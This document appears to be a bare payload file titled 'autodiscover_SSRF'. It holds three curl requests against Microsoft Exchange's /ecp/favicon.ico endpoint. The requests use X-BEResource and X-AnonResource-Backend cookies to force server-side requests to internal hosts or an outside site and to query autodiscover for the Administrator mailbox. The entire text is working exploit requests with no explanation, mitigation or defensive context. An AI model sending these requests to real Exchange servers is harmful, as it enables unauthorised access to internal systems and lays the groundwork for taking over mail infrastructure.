# autodiscover_SSRF

Payload A

curl -i -s -k -X $'POST' \
    -H $'Host: externaldomain.local' -H $'Content-Length: 370' -H $'Content-Type: text/xml' \
    -b $'X-BEResource=internalservername.domain.local/autodiscover/autodiscover.xml#~1' \
    --data-binary $'<?xml version=\"1.0\" encoding=\"utf-8\"?><Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"><Request><EMailAddress>Administrator@externaldomain.local</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>' \
    $'https://externaldomain.local/ecp/favicon.ico'


Payload B

curl -i -s -k -X $'GET' \
    -H $'Host: localhost' \
    -b $'X-AnonResource-Backend=www.bbc.co.uk/#~1; X-AnonResource=true' \
    $'https://externaldomain.local/ecp/favicon.ico'

Payload C

curl -i -s -k -X $'POST' \
    -H $'Host: localhost' -H $'Content-Length: 370' -H $'Content-Type: text/xml' \
    -b $'X-BEResource=internalserver.domain.local/autodiscover/autodiscover.xml#~1941962753' \
    --data-binary $'<?xml version=\"1.0\" encoding=\"utf-8\"?><Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"><Request><EMailAddress>Administrator@externaldomain.local</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>\x0d\x0a' \
    $'https://externaldomain.local/ecp/favicon.ico'
